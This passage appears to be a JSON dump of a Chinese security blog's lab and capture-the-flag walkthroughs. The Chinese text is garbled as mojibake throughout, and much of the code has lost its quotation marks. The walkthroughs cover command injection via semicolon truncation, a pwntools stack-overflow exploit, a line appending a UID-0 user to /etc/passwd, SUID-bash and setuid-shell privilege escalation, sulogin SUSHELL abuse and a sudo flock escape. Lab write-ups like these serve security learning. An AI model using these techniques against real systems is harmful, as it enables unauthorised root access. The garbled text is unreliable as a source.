å¦‚æœç•™è¨€å¤ªé•¿ return render_template(message.html, msg=ç•™è¨€å¤ªé•¿äº†ï¼, status=ç•™è¨€å¤±è´¥) user_message = user_message.replace( , ).replace(_, ) # ç§»é™¤ç©ºæ ¼å’Œä¸‹åˆ’çº¿ result = dynamic_execute(message_type, user_message) # åŠ¨æ€æ‰§è¡Œç”¨æˆ·è¾“å…¥çš„å†…å®¹ return render_template(message.html, msg=result, status=fusername,ç•™è¨€æˆåŠŸ)### ä½†æ˜¯è¿™é‡Œæœ‰é•¿åº¦é™åˆ¶æˆ‘ä»¬å¯ä»¥ chmod +s biinbash a ç»™åˆ°tmpæ–‡ä»¶ä¸‹a æ–‡ä»¶ç„¶åæ‰§è¡Œ æ‹¿root è¿™é‡Œç¾¤ä¸»ç»™äº†å¦ä¸€æ–¹æ³• ä¿®æ”¹etcpasswdæƒé™é€šè¿‡ 0o666è¡¨ç¤ºå…«è¿›åˆ¶ linuxé‡Œé¢æƒé™ä¹Ÿæ˜¯å…«è¿›åˆ¶æ‰€ä»¥æƒé™æ˜¯rw-rw-rw å‘ç°å¯å†™äº† payload å¯†ç 123456 echo ll:$y$j9T$ExvEUV2wz6oo99qy/ZJc61$4CBi7jCbWQ.pBlG9vmnhH0z3.uchXkOXaFIl9Zz5Y18:0:0:xxoo,,,:/root:/bin/bash /etc/passwd æ€»ç»“ä¸€ä¸‹1ï¼šå¤šå­¦å­¦python","tags":["è¡¨è¾¾å¼æ³¨å…¥"]},{"title":"insomniaé¶æœº---éš¾åº¦easyçŸ¥è¯†ç‚¹-åˆ†å·æˆªæ–­","path":"/2025/06/17/posts/insomnia/","content":"insomniaé¶æœºâ€”éš¾åº¦easyçŸ¥è¯†ç‚¹-åˆ†å·æˆªæ–­ Nmapæ‰«æå‘ç°ç«¯å£å¼€æ”¾ 8080ç„¶åæˆ‘ä»¬è®¿é—®çœ‹ä¸‹æ˜¯ä»€ä¹ˆ æˆ‘ä»¬è®¿é—®å‘ç°ä¸€ä¸ªç½‘é¡µæ„Ÿè§‰æ²¡ä»€ä¹ˆå…³é”®åœ°æ–¹ è¿™é‡Œæˆ‘ä»¬æ³¨æ„ä¸‹ï¼ æˆ‘ä»¬æ‰«è¿™ç½‘ç«™å› ä¸ºä»–404ä¹Ÿè¿”å›200å¯¼è‡´æ‰«æå·¥å…·ä¸èƒ½ç”¨ æˆ‘ä»¬å¯ä»¥è®¾ç½®ä¸è¦è¿”å›é‚£ä¸ªæ•°å­—æ¥é¿å… æ¯”å¦‚gobuster gobuster dir -u http://172.20.10.2:8080 \\ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \\ -x php,txt \\ --exclude-length 2899 é¿å…é•¿åº¦2899çš„æ˜¾ç¤ºæˆ‘ä»¬å‘ç°ä¸‰ä¸ªæ–‡ä»¶ å…¶ä¸­å…³é”®çš„æ–‡ä»¶æ˜¯è¿™ä¸ªadministration.php å…³äºè¿™ä¸ªä¸»é¡µé¢ä¸æ˜¯ä½ è¾“å…¥ä»€ä¹ˆç„¶åæ˜¾ç¤ºä»€ä¹ˆå— ç„¶åæˆ‘è¯•äº†å¾ˆå¤šæ¯”å¦‚ 1ï¼šSQLæ³¨å…¥2ï¼šSSRF 3ï¼šæ¨¡æ¿æ³¨å…¥ éƒ½ä¸è¡Œ ç„¶å å¾ˆå¥‡æ€ªçš„å°±æ¥äº† æˆ‘ç›´æ¥ç”¨gobusteræ‰«æå‘ç°ä½  æ¯å½“ä½ æ‰«æä¸€æ¬¡ä»–ä¼šå¾€å¯¹è¯æ¡†æ”¾å…¥éƒ½æ˜¯éƒ½æ˜¯ç©ºæ ¼ è¿™é‡Œå„ä½å¤§ä½¬åº”è¯¥éƒ½æœ‰æ€è·¯äº† ç”¨FUZZä¸‹ ç„¶åæˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªlogfileæ–‡ä»¶æˆ‘ä»¬åŠ ä¸Šå‚æ•°è¿‡å»æœç„¶å•Š æˆ‘è¾“å…¥1èŠå¤©å°±æ˜¾ç¤º1 ç„¶åæˆ‘è¯•äº†å¾ˆå¤šæ¯”å¦‚logfile éƒ½ä¸è¡Œ ç„¶åæˆ‘ä»¬å¯ä»¥è¯•è¯•ç”¨sleepæ¥çœ‹æ˜¯ä¸æ˜¯æ²¡æœ‰å›æ˜¾æ¯”å¦‚ logfile=;sleep 5; å‘ç°çœŸçš„å»¶è¿Ÿäº†ç„¶åç›´æ¥busybox nc åå¼¹shell æ‹¿åˆ°shellæƒé™æˆ‘ä»¬æ‹¿åˆ°SHELLå¯ä»¥çœ‹çœ‹æºç  å‘ç°æ˜¯ç›´æ¥æ‹¼æ¥ æˆ‘ä»¬ç”¨linpeasè·‘ä¸€ä¸‹å‘ç°å¯ä»¥ç”¨è¿™ä¸ªshæ–‡ä»¶ è€Œä¸”è¿™æ–‡ä»¶æ˜¯æˆ‘ä»¬å¯ä»¥å†™çš„é‚£å°±å¾ˆç®€å•äº† æ–‡ä»¶å†™å…¥binbash ç„¶åæ‹¿åˆ°julia æ‹¿rootå› ä¸ºå¯ä»¥çœ‹bash_historyæˆ‘ä»¬çœ‹ä¸‹å†å²è®°å½•å‘ç°äº†å†å¾€å®šæ—¶ä»»åŠ¡åå¼¹ ç„¶åæˆ‘ä»¬ä½¿ç”¨ä¸‹é¢ç¨‹åºæ¥æŸ¥çœ‹å‘ç°å¯ä»¥æœ‰ä¸€ä¸ªshæ–‡ä»¶è¢«ROOTç”¨æˆ·ç”¨binbashæ¥è¿è¡Œ pspy64 /bin/sh -c /bin/bash /var/cron/check.sh ç”¨shæ¥æ‰§è¡Œå‘½ä»¤ è€Œä¸”è¿™æ–‡ä»¶æˆ‘ä»¬å¯å†™ æˆ‘ä»¬ç›´æ¥å¾€é‡Œé¢å†™å…¥å‘½ä»¤å¦‚ chmod +s /bin/bash å‘ç°æˆåŠŸæ‹¿åˆ°SUIDæƒé™ ææƒæˆåŠŸ /bin/bash -p æ€»ç»“ä¸€ä¸‹1ï¼šå¤šç”¨ç”¨ï¼›æˆªæ–­ ,å¤šè§‚å¯Ÿè”åŠ¨æ€§","tags":["åˆ†å·æˆªæ–­"]},{"title":"pwn-tool","path":"/2025/06/17/posts/tool-pwn/","content":"pwn-tools first - ç¬¬ä¸€æ¬¡ è¿™é‡Œå› ä¸ºæˆ‘ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡ç©PWNçš„é¢˜ç›®æ‰€ä»¥ä¹Ÿæ˜¯çœ‹ç¾¤ä¸»çš„è§†é¢‘æ¥å­¦ä¹  å…ˆçœ‹æ­¥éª¤åé¢æ€»ç»“ä¼šè§£é‡Š ç„¶åæˆ‘ä»¬NCä¸‹ è¯•è¯•å‘ç°æ˜¯ä¸€ä¸ªNC è¿™é‡Œè¦è¾“å…¥250æ¬¡ç»è¿‡æµ‹è¯• è¿™é‡Œä½ å¯ä»¥å†™PYè„šæœ¬ ä¹Ÿå¯ä»¥ç”¨ PWN è¿™é‡Œé™„ä¸Šä»£ç  from pwn import *import rer=remote(172.20.10.2,1337)for i in range(250): print(i) a = r.recvuntil(b: ).decode() print(a) x = re.split(/[|/],a) r.sendline(x[1].encode())r.interactive() æ‹¿åˆ°å¯†ç å¾—åˆ°SHELL ç„¶åè¿™é‡Œç¨‹åºæˆ‘ä»¬å…ˆæŠŠå‘é€å‡ºæ¥ ç„¶åIDEAåç¼–è¯‘ä¸‹ å¾—åˆ°ä¸»å‡½æ•°ç„¶åå·¦è¾¹æœ‰ä¸€ä¸ªfun å‡½æ•°ç‚¹å¼€çœ‹çœ‹ å‘ç°äº†è¦åˆ©ç”¨çš„å‡½æ•°å› ä¸ºä¸»å‡½æ•°æœ‰ä¸€ä¸ªgetsæ²¡æœ‰æ£€æµ‹è¾“å…¥ä¸ªæ•°æˆ‘ä»¬åˆ©ç”¨ä¸‹æ ˆæº¢å‡º æ ˆæº¢å‡ºä»£ç å¦‚ä¸‹ ä»£ç å¦‚ä¸‹ from pwn import *import rer=remote(172.20.10.2,12345)junk = bA * 23fun = p64(0x401186)payload = junk + funr.recvuntil(bplease input/n)r.sendline(payload)r.interactive() æ‹¿åˆ°ROOT æˆ‘ä»¬æ‹¿åˆ°äº†ROOTæˆ‘æ¥è§£é‡Šä¸‹åŸç† å½“ä½ ä¸åœçš„å¾€è¿™ä¸ªæ•°ç»„æ”¾å…¥æ•°å€¼æ—¶ æ»¡çš„æ—¶å€™ä»–ä¼šåˆ°ç¼“å†²åŒºæ‹¿å»æ•°æ® æˆ‘ä»¬å°±æ˜¯æ¥æ§åˆ¶ç¼“å†²åŒºçš„æ•°æ®æ‰¾åˆ°é‚£ä¸ªä¸´ç•Œå€¼çˆ†å‘åæˆ‘ä»¬æ§åˆ¶çš„å€¼ æˆ‘ä»¬ä¸Šé¢å›¾ç®—å‡ºæ¥äº†æ˜¯23 å¦‚ä½•è®¡ç®—ï¼Ÿ ä½¿ç”¨ pwndbg /opt/find_backdoor r ç„¶åè¾“å…¥ä¸€é•¿ä¸²æœ‰è§„åˆ™æ•°æ®ç”Ÿæˆå¯ä»¥ä½¿ç”¨ä»£ç  python3 -c from pwn import cyclic; print(cyclic(100)) baaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa ç„¶åæˆ‘ä»¬æ”¾å…¥è¿›å» å¯ä»¥çœ‹çˆ†å‡ºäº† ret ä¸‹é¢é‚£ä¸ª6161686161616761æ˜¯çˆ†å‘å€¼ ç„¶åæˆ‘ä»¬ä½¿ç”¨å·¥å…·æ¥çœ‹åç§»é‡æ˜¯å¤šå°‘ python3 -c from pwn import *; print(cyclic_find(0x6161686161616761)) ç®—å‡º23 æ‰€ä»¥æˆ‘ä»¬POCä»£ç å°±æ˜¯23ä¸ªAåŠ ä¸Šå‡½æ•°åœ°å€ æ€»ç»“ä¸€ä¸‹1ï¼šä»è¾“å…¥çš„å“ªä¸€ä½å¼€å§‹ï¼Œè¦†ç›–äº†è¿”å›åœ°å€ï¼ˆRIPï¼‰ 2ï¼šå½“ä½ åˆ©ç”¨æ ˆæº¢å‡ºæ”»å‡»ç¨‹åºæ—¶ï¼šä½ è¦ç²¾ç¡®å¡«æ»¡å‰é¢çš„å†…å®¹ï¼Œåˆšå¥½è¦†ç›–è¿”å›åœ°å€æ‰€ä»¥å¿…é¡»çŸ¥é“è¿™ä¸ªâ€œåç§»å€¼â€","tags":["åˆ†å·æˆªæ–­"]},{"title":"Lockeré¶æœº---éš¾åº¦easyçŸ¥è¯†ç‚¹-åˆ†å·æˆªæ–­,Sulogin","path":"/2025/06/12/posts/Locker/","content":"Lockeré¶æœºâ€”éš¾åº¦easyçŸ¥è¯†ç‚¹-åˆ†å·æˆªæ–­,Sulogin Nmapæ‰«æå‘ç°ç«¯å£å¼€æ”¾ æˆ‘ä»¬è®¿é—®å‘ç°ä¸€ä¸ªç½‘é¡µæ„Ÿè§‰æ²¡ä»€ä¹ˆå…³é”®åœ°æ–¹ è¿™é‡Œç©¿è¶Šå•Š æ³¨å…¥å•Š åŒ…å« éƒ½ä¸è¡Œ ç»“æœä½¿ç”¨åˆ†å·æˆªæ–­ æ‰€ä»¥å¹³æ—¶å¤šç”¨åˆ†å·æ²¡é—®é¢˜ æ‹¿åˆ°shellæƒé™æˆ‘ä»¬åˆ°webæƒé™æŸ¥çœ‹å‘ç°ä¸€ä¸ªsulogin sulogin: ç”¨äº å•ç”¨æˆ·æ¨¡å¼ä¸‹è·å– root æƒé™ å¦‚ ç³»ç»Ÿæ•…éšœä¿®å¤ï¼ˆå¦‚å¿˜è®° root å¯†ç æ—¶é‡ç½®å¯†ç ï¼‰ã€‚ ç»´æŠ¤æ¨¡å¼ä¸‹æ‰§è¡Œç‰¹æƒæ“ä½œï¼ˆéœ€é€šè¿‡å®‰å…¨éªŒè¯ï¼‰ã€‚ å®ƒå¯ä»¥ç›´æ¥è¯»å–ç¯å¢ƒå˜é‡é‡Œé¢çš„å€¼ ä¾‹å¦‚ï¼šexport SUSHELL=/tmp/æ¶æ„ç¨‹åº sulogin ä¼šç›´æ¥æ‰§è¡Œ /tmp/æ¶æ„ç¨‹åºã€‚ å·¥å…· ç¯å¢ƒå˜é‡ä¾èµ– æ‰§è¡Œé€»è¾‘ å®‰å…¨è®¾è®¡ç›®çš„ sulogin ä»…ä¾èµ– è‡ªå®šä¹‰å˜é‡ ç›´æ¥æ‰§è¡ŒæŒ‡å®šè·¯å¾„çš„ç¨‹åº é¿å…è¢« PATH æ³¨å…¥æ¶æ„ç¨‹åº cat ç­‰å‘½ä»¤ ä¾èµ– PATH æŒ‰ PATH é¡ºåºæœç´¢å¯æ‰§è¡Œæ–‡ä»¶ æä¾›ç”¨æˆ·è‡ªå®šä¹‰è·¯å¾„çš„çµæ´»æ€§ æ‹¿rootæˆ‘ä»¬ç”¨è€ç‰ˆæœ¬çš„Cè¯­è¨€ç¼–å†™ä¸€ä¸ªè®¾ç½®ç³»ç»Ÿå‘½ä»¤çš„ä»£ç  Cè¯­è¨€ä»£ç  #includestdio.h // åŸºç¡€è¾“å…¥è¾“å‡ºåº“#includestdlib.h // æä¾› system() ç­‰å‡½æ•°ï¼Œç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤#includeunistd.h // æä¾› setuid()ã€setgid() ç­‰ç³»ç»Ÿè°ƒç”¨int main() setuid(0); // å°†è¿›ç¨‹çš„æœ‰æ•ˆç”¨æˆ· ID è®¾ç½®ä¸º 0ï¼ˆroot ç”¨æˆ·çš„ UIDï¼‰ setgid(0); // å°†è¿›ç¨‹çš„æœ‰æ•ˆç»„ ID è®¾ç½®ä¸º 0ï¼ˆroot ç»„çš„ GIDï¼‰ system(/bin/bash); // æ‰§è¡Œ /bin/bashï¼Œå¯åŠ¨ä¸€ä¸ªæ–°çš„ Shell ä¸ºä»€ä¹ˆè¦å»ºç«‹Cæ–‡ä»¶ åŒºåˆ«ï¼šC ç¨‹åºé€šè¿‡ setuid(0) ç›´æ¥ä¿®æ”¹è¿›ç¨‹æƒé™ï¼Œè€Œ Shell è„šæœ¬ä¾èµ–å¤–éƒ¨æœºåˆ¶ï¼ˆå¦‚ SUID æƒé™ï¼‰é—´æ¥ææƒã€‚ æˆ‘ä»¬WGETä¸‹æ¥æ·»åŠ X å è®°å¾—å¯¼å…¥ç¯å¢ƒå˜é‡SUSHELLæ˜¯æˆ‘è‡ªå®šä¹‰çš„å˜é‡ä»–ä¼šä¼˜ç§€è¯»å–åè¯»etcpasswdçš„root æ€»ç»“ä¸€ä¸‹1ï¼šå¤šç”¨ç”¨ï¼›æˆªæ–­ 2ï¼šsuloginæ˜¯ Linux ç³»ç»Ÿä¸­ä¸“é—¨ç”¨äºå•ç”¨æˆ·æ¨¡å¼çš„ç™»å½•ç¨‹åºï¼Œè·¯å¾„ä¸ºsbinsuloginã€‚å½“ç³»ç»Ÿè¿›å…¥å•ç”¨æˆ·æ¨¡å¼æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ suloginï¼Œè¦æ±‚ç”¨æˆ·è¾“å…¥ root å¯†ç ï¼ˆéƒ¨åˆ†æ—§ç³»ç»Ÿå¯ç›´æ¥è¿›å…¥ï¼‰ã€‚ è¿™é¶æœºæŠŠrooté”å®šäº†ä¸èƒ½SU ROOT æ„Ÿå¹å·å¯ä»¥æŠŠrooté”å®šåœ¨etcshadowé‡Œé¢ root:!:18649:0:99999:7::: # è¡¨ç¤º root è¢«é”å®š æœ¬èº«å¯ä»¥-e è·å¾—æƒé™å¯èƒ½è¢«é”å®šäº†å°±ä¸è¡Œ SUSHELLæ˜¯suloginè°ƒç”¨çš„å¦ä¸€ä¸ªç¯å¢ƒå˜é‡ æ‰‹åŠ¨æŒ‡å®šå°±è¡Œ 3ï¼šå•ç”¨æˆ·æ¨¡å¼æ˜¯æ“ä½œç³»ç»Ÿçš„ä¸€ç§ç‰¹æ®Šå¯åŠ¨çŠ¶æ€ï¼Œä»…å…è®¸ä¸€ä¸ªè¶…çº§ç”¨æˆ·ï¼ˆrootï¼‰ç™»å½•ç³»ç»Ÿï¼Œä¸”ä¸åŠ è½½ç½‘ç»œæœåŠ¡ã€å›¾å½¢ç•Œé¢ç­‰éå¿…è¦ç»„ä»¶ 4ï¼šsulogin å’Œ path çš„åŒºåˆ« â€‹\t4.1sulogin ä¼šæ‰§è¡Œä½ çš„å‘½ä»¤ å®‰å…¨é£é™©- ä¾èµ– PATH å¯èƒ½å¼•å…¥è·¯å¾„éå†é£é™© â€‹\t4.2pathä¼šæ‰¾å‘½ä»¤çš„ç¨‹åºæ‰¾åˆ°å°±æ‰§è¡Œ æ¯”å¦‚ CATä»–å°±ä¼šåœ¨å¦‚BINé‡Œé¢æ‰¾ å®‰å…¨é£é™© - ç¯å¢ƒå˜é‡ä¿®æ”¹","tags":["Sulogin"]},{"title":"vulnyé¶æœº---éš¾åº¦easyçŸ¥è¯†ç‚¹-file-manager","path":"/2025/06/12/posts/vulny/","content":"vulnyé¶æœºâ€”éš¾åº¦easyçŸ¥è¯†ç‚¹-file-manager Nmapæ‰«æå‘ç°ç«¯å£å¼€æ”¾3333ç«¯å£å’Œä¸€ä¸ªmysql æˆ‘ä»¬ä¸Šå»ç½‘é¡µ æˆ‘å…ˆæµ‹è¯•çš„æ— å¯†ç è®¿é—®æ˜¯ä¸è¡Œçš„ç„¶åæˆ‘ä»¬è®¿é—®ç½‘é¡µ è¿™é‡Œå‘ç°æˆ‘ä»¬è¾“å…¥ä»€ä¹ˆä»–å°±æ˜¾ç¤ºä»€ä¹ˆæ¯”å¦‚ä½ è¾“å…¥123å°±åœ¨homeçš„123 å¯ä»¥è¯•è¯•çœ‹ç›®å½•ç©¿è¶Šä½†æ˜¯æ²¡å‡ºæ¥ æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªæ€è·¯ çˆ†ç ´ç”¨æˆ·åå‘— è¿™é‡Œæˆ‘ç”¨dirsearch æ‰«æå‡ºæ¥æœ‰ä¸€ä¸ªsecretç›®å½• ä½†æ˜¯è¿˜æ˜¯ä»€ä¹ˆéƒ½æ²¡æœ‰ å› ä¸ºdirsearchæ‰«æå¾ˆå¤šwordpressæˆ‘å°±ç”¨Nucleiæ‰«æäº†ä¸‹å‘ç°äº†ä¸€ä¸ªCVE åˆ©ç”¨é“¾æ¥ï¼šCVE-2020-25213 WordPressè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç° - Salvere - åšå®¢å›­ åˆ©ç”¨è¿™ä¸ªCVEä¸Šä¼ æ–‡ä»¶ç„¶åè®¿é—®è¯•è¯• ç„¶åå°±å¾ˆç®€å•çš„åå¼¹å°±è¡Œ æ‹¿åˆ°shellæƒé™æ‹¿åˆ°æˆ‘é©¬ä¸Šå°±å»ç¿»web-configè¿™æ˜¯wordpressçš„é…ç½®æ–‡ä»¶å› ä¸º ä»–æœ‰mysql ç„¶å æˆ‘è‚¯å®šå…ˆå»çœ‹çœ‹ ç»“æœç¿»äº†20åˆ†é’Ÿ æ²¡å‘ç° çœ‹äº†çœ¼WPç»“æœ..æ˜¯æ³¨é‡Š åœ¨usrsharewordpresswp-config.php æ–‡ä»¶ å±…ç„¶æ˜¯æ³¨é‡Š çœŸæ²¡çœ‹åˆ° æ‹¿root å¾ˆç®€å•FLOCK ç›´æ¥å¯ä»¥æœåˆ° https://gtfobins.github.io/gtfobins/flock/#sudo sudo flock -u / /bin/sh æ€»ç»“ä¸€ä¸‹1ï¼šå¤šçœ‹çœ‹æ³¨é‡Šå§ 2ï¼šCVE-wp-file-manager è¿™æ˜¯ä¸€ä¸ªæ’ä»¶ åœ¨webä½ å¯ä»¥ä¸‹è½½è¿˜å¯ä»¥çœ‹åˆ°æºç  å½±å“ç‰ˆæœ¬ 6.0-6.8 3ï¼šflock æ˜¯ Linux ç³»ç»Ÿä¸­ç”¨äºæ–‡ä»¶é”å®šçš„å‘½ä»¤ -u è¡¨ç¤ºè§£é” æ–‡ä»¶ -c ä¹Ÿå¯ä»¥æ‰§è¡Œå‘½ä»¤å¦‚ sudo /usr/bin/flock /tmp/mylock -c cat /root/root.txt","tags":["wordpress"]},{"title":"observeé¶æœº---éš¾åº¦lowçŸ¥è¯†ç‚¹-fuzz-ln","path":"/2025/06/11/posts/Observer/","content":"observeé¶æœºâ€”éš¾åº¦lowçŸ¥è¯†ç‚¹-fuzz åªåšäº†WEB åé¢linuxçš„è‹¦æ‰‹äº† Nmapæ‰«æå‘ç°ç«¯å£å¼€æ”¾3333ç«¯å£å’Œä¸€ä¸ªSSHæˆ‘ä»¬ä¸Šå»ç½‘é¡µ è¿™é‡Œå‘ç°æˆ‘ä»¬è¾“å…¥ä»€ä¹ˆä»–å°±æ˜¾ç¤ºä»€ä¹ˆæ¯”å¦‚ä½ è¾“å…¥123å°±åœ¨homeçš„123 å¯ä»¥è¯•è¯•çœ‹ç›®å½•ç©¿è¶Šä½†æ˜¯æ²¡å‡ºæ¥ æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªæ€è·¯ çˆ†ç ´ç”¨æˆ·åå‘— æˆ‘ä»¬ä½¿ç”¨FUZZæ¥çˆ†ç ´ä¸‹ç”¨æˆ·å åç¼€å°±å†™.bash_history ç”¨æˆ·åjan wfuzz -w usrsharezidianSecLists-2023.2Usernamesxato-net-10-million-usernames.txt -u http://172.20.10.2:3333/FUZZ/.bash_history â€“hw 8 ç½‘é¡µæŸ¥çœ‹ä¸‹ ç„¶åè¯»ä¸‹sshçš„å…¬é’¥æˆ‘ä»¬ç›´æ¥ç™»å½• æ‹¿åˆ°shellæƒé™ è¿™é‡Œæœ‰ä¸€ä¸ªsystemctl ä½†æ˜¯æˆ‘æ²¡æ³•ææƒåé¢çœ‹WPäº† æ‹¿rootè¿™é‡Œæœ‰ä¸€ä¸ªROOTè¿›ç¨‹çš„observeè¿›ç¨‹ æˆ‘ä»¬çš„é‚£ä¸ªç½‘é¡µå°±æ˜¯ç”¨rootè¿è¡Œçš„ æˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨ç½‘é¡µæ¥è¯»å– æ€»ç»“ä¸€ä¸‹1ï¼šå¤šçœ‹çœ‹è¿›ç¨‹ 2ï¼šè½¯è¿æ¥å‘½ä»¤ ln -sv root xxoo","tags":["fuzz","ln"]},{"title":"floweré¶æœº---éš¾åº¦lowçŸ¥è¯†ç‚¹-base64-py","path":"/2025/06/03/posts/flower/","content":"floweré¶æœºâ€”éš¾åº¦lowçŸ¥è¯†ç‚¹-base64-pyå¤šæ€è€ƒ Nmapæ‰«æå‘ç°ç«¯å£å¼€æ”¾è¿™é‡Œåªæœ‰ä¸€ä¸ª80æˆ‘ä»¬ä¸Šå»å‘ç°æ˜¯ä¸€ä¸ªç‚¹å‡»åæ˜¾ç¤ºèŠ±ç“£çš„æ–‡ä»¶ ï¼ˆdirsearchæ‰«å‡ºæ¥å¾ˆå¤šæ²¡ç”¨çš„ï¼‰ æˆ‘ä»¬å¯ä»¥æŠ“åŒ…çœ‹çœ‹æ€ä¹ˆæ˜¾ç¤ºçš„ å‘ç°æ˜¯base64çš„ è§£å¯†å‡ºæ¥æ˜¯1+2 æˆ‘ä»¬ç›´æ¥è¯•è¯•æ”¹å…¶ä»–çš„å‘ç°ä¹Ÿå¯ä»¥ ç„¶åç›´æ¥system(â€˜whoamiâ€™) å‘ç°å¯ä»¥ å¥½äº†WEBç»“æŸ æ‹¿åˆ°shellæƒé™sudo -l å‘ç°å¯ä»¥æ‰§è¡Œpyè„šæœ¬æ˜¯ä¸€ä¸ªå†™å…¥åºåˆ—åŒ–çš„æ•°æ® ç¢ç£¨äº†å¾ˆä¹… æœ€åä¸ä¼šäº†çœ‹çš„WP æ˜¯æŒŸæŒimportæ–‡ä»¶ import pickle diary {â€œNovember28â€:â€i found a blue violaâ€,â€December1â€:â€i lost my blue violaâ€}p open(â€˜diary.pickleâ€™,â€™wbâ€™)pickle.dump(diary,p) æˆ‘ä»¬æŒŸæŒè¿™ä¸ªæ–‡ä»¶ ä»–çš„ç›®å½•å¯ä»¥å†™å…¥æ–‡ä»¶å°±ç¦»è°± æ‹¿rootå¾—åˆ°ROSEç„¶ååˆå¯ä»¥æ‰§è¡Œ .plantbook è¿™æ˜¯ä¸€ä¸ªå†™å…¥ä»€ä¹ˆæ‰“å°çš„è„šæœ¬ ä½†æ˜¯å¾ˆå…³é”®â€”â€¦â€¦ æˆ‘ä¹Ÿæ²¡æƒ³å‡ºæ¥ è¿™æ–‡ä»¶æ˜¯æˆ‘ä»¬çš„æˆ‘ä»¬å¯ä»¥ä¿®æ”¹å•Š â€”- æ‹¿ä¸‹äº† æ€»ç»“ä¸€ä¸‹å–½1ï¼šå¤šçœ‹çœ‹æ•°æ®åŒ… 2ï¼šå¤šè¯•è¯•ç›®å½•åŠŸèƒ½ 3ï¼šImportåŠ«æŒå­¦åˆ°äº† çœ‹çœ‹æƒé™æ˜æ˜å¯ä»¥å†™å…¥çš„","tags":["base64","python"]},{"title":"mixueé¶æœº---éš¾åº¦ç¾¤å‹çŸ¥è¯†ç‚¹-logic-monitor.æˆ‘å†°åŸå‘¢","path":"/2025/06/02/posts/mixue/","content":"mixueé¶æœºâ€”éš¾åº¦ç¾¤å‹çŸ¥è¯†ç‚¹-logic-monitor ä½ çˆ±æˆ‘æˆ‘çˆ±ä½ èœœé›ªå†°åŸç”œèœœèœœ Nmapæ‰«æå‘ç°ç«¯å£å¼€æ”¾ ç›´æ¥ç™»å½•ç„¶ådirsearchä¸è¦åœ å¥½ç»å…¸çš„ç™»å½•ç•Œé¢å•Šåˆ«è¯´äº†å¼€æ‰« ä¸€æ‰«ä¸çŸ¥é“å•Š æ²¡æ‰«ä¸­ã€‚ã€‚ã€‚ã€‚çœ‹çœ‹ç½‘é¡µå‘ç°ä¸€ä¸ªç”¨æˆ·sublarge ä»–æ˜¯å¼±å£ä»¤ 123456ä¸Šå»äº† è¿™ç§å¾ˆç®€å• çœ‹æ•°æ®åŒ… å‘ç°æ˜¯é€šè¿‡cookieé‡Œé¢å€¼æ¥åˆ¤æ–­çš„ ä½†æ˜¯æ³¨æ„ä½ ä¿®æ”¹éƒ½è¦æŠŠ0æ”¹ä¸º1 å¥½äº†WEBç»“æŸäº†æˆ‘ä»¬æ‹¿åˆ°äº†shell æ‹¿åˆ°shellæƒé™ ç¿»æ–‡ä»¶å‘ç°äº†å¯†ç ç„¶åæˆ‘ä»¬è¿è¡Œä¸‹pspy64å‘ç°ä¸€ç›´åœ¨è¿è¡Œmonitor çœ‹çœ‹ä»€ä¹ˆæ„æ€ æ„æ€æ˜¯ç¼–è¾‘äº†keyå°±æ‰§è¡Œchange.sh (ä¸‹é¢é‚£ä¸ªrootæ˜¯æˆ‘åšå®Œçœ‹çš„) è¿™æ˜¯suraxddqçš„æ–‡ä»¶ æˆ‘ä»¬è¯•è¯•åŒä¸€ä¸ªå¯†ç å¯ä»¥ä¸Šå»ä¸ å‘ç°å¯ä»¥ ç„¶åå¯ä»¥ æ‹¿rootä¸‹é¢æ˜¯change.shçš„ä½œç”¨ å°±æ˜¯ç»™æƒé™ æˆ‘ä»¬å¯ä»¥ç›´æ¥å¤åˆ¶bashç„¶å-pè¿è¡Œ æ‹¿åˆ°äº†rootäº† æ€»ç»“ä¸€ä¸‹å–½1ï¼šå¤šçœ‹çœ‹æ•°æ®åŒ… 2ï¼šmonitor æ˜¯ä¸€ä¸ªç›‘æ§çš„ç¨‹åº 3ï¼špspy64å¯ä»¥çœ‹è¿›ç¨‹ å‰é¢æœ‰å…·ä½“ç”¨æˆ·å· 4ï¼šå¯†ç å¤ç”¨","tags":["logic","monitor"]},{"title":"ximaié¶æœº---éš¾åº¦LOW-easy-çŸ¥è¯†ç‚¹-wp-sqlmap-wpplugin","path":"/2025/05/29/posts/ximai/","content":"ximaié¶æœºâ€”éš¾åº¦easy-medium-çŸ¥è¯†ç‚¹-wp-sqlmap-wpplugin è¿™é‡Œåº”è¯¥æœ‰å¾ˆå¤šæ­¥éª¤æ‹¿shell ä½†æˆ‘å¥½åƒé€‰æ‹©äº†æœ€éš¾çš„ Nmapæ‰«æå‘ç°3ä¸ªç«¯å£å¼€æ”¾çœ‹åˆ°è¿™é‡Œä½ è‚¯å®šç¬‘å˜»äº† è‚¯å®šæ˜¯mysql skipå¯¹å§ä½†æ˜¯æ²¡æœ‰åµç”¨ å¦‚å›¾æ‰€ç¤º mysqlä¸Šä¸å» é‚£å°±ç»å…¸çš„æ‰«æç›®å½•åŠ ä¸Šç™»å½•ç½‘ç«™çœ‹çœ‹ä»€ä¹ˆå†…å®¹ 80æ˜¯ä¸€ä¸ªç»å…¸çš„apacheç›®å½•è¿™é‡Œä¸è¯´äº† â€“ä½ çš„å­—å…¸ä¸è¡Œå•Šæœ‰ä¸€ä¸ªæç¤ºæ²¡æ‰«å‡ºæ¥â€¦ reminder.php è¿™é‡Œæœ‰ä¸ªè¿™ä¸ªæ–‡ä»¶ç½‘ç«™ä½†æ˜¯æˆ‘æ²¡ç”¨ä¸Š.. è¿™é‡Œæœ‰info.phpä½†æ˜¯æˆ‘æ²¡æœ‰ç”¨åˆ° æœ‰ä¸€ä¸ªadminer.php æ˜¯ä¸€ä¸ªç™»å½•æ•°æ®åº“çš„ç½‘ç«™ è¿™é‡Œæˆ‘ç”¨äº†åŒ…å«å› ä¸ºå‰é¢PHPåŒ…å«æ‰“å¼€äº† ä½†æ˜¯æ²¡ç”¨ä¸Šï¼Œç„¶åsqlæ³¨å…¥è¯•äº†è¯•ä¹Ÿä¸è¡Œå°±æ”¾å¼ƒäº†è½¬å‘8000ç«¯å£ 